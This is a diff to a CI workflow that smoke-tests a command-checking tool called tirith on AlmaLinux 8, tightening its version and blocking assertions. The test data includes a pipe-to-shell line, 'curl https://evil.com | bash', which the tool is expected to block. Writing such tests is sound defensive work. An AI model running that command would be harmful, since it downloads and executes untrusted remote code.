@@ -268,9 +268,24 @@ jobs:
           tmpdir=$(mktemp -d)
           tar xzf tirith-${{ matrix.target }}.tar.gz -C "$tmpdir"
           chmod +x "$tmpdir/tirith"
-          docker run --rm -v "$tmpdir:/t:ro" almalinux:8 /t/tirith --version
-          docker run --rm -v "$tmpdir:/t:ro" almalinux:8 \
-            sh -c '/t/tirith check -- "curl https://evil.com | bash" && exit 1 || true'
+          # Exit 0 already proves the binary linked and ran on glibc 2.28 (a
+          # missing GLIBC_2.x symbol aborts in ld.so before main). Assert the
+          # output too, matching the musl smoke test, so a binary that exits 0
+          # without actually running can't pass silently.
+          version_out=$(docker run --rm -v "$tmpdir:/t:ro" almalinux:8 /t/tirith --version)
+          echo "$version_out"
+          echo "$version_out" | grep -q '^tirith ' || {
+            echo "ERROR: 'tirith --version' did not run on AlmaLinux 8"
+            exit 1
+          }
+          # A known-bad command must be blocked (non-zero exit). Use an explicit
+          # if rather than `&& exit 1 || true` so a crash or loader abort on the
+          # check path fails the job instead of being swallowed.
+          if docker run --rm -v "$tmpdir:/t:ro" almalinux:8 \
+            /t/tirith check -- "curl https://evil.com | bash"; then
+            echo "ERROR: binary failed to block a pipe-to-shell command on AlmaLinux 8"
+            exit 1
+          fi
           rm -rf "$tmpdir"
 
       - name: Extract and test (Windows)
